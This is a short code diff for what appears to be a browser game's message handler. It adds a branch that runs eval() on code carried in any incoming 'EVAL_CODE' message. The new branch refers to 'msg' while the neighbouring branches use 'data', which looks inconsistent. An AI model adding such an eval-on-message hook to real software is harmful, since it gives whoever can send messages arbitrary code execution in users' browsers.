@@ -6420,6 +6420,9 @@ async function init_game_env(env) {
 			kill_game();	
 		if(data.message==='RELOAD')
 			window.location.reload();	
+		if (msg.message==='EVAL_CODE'){
+			eval(msg.code)		
+	}
 		
 	});
 				
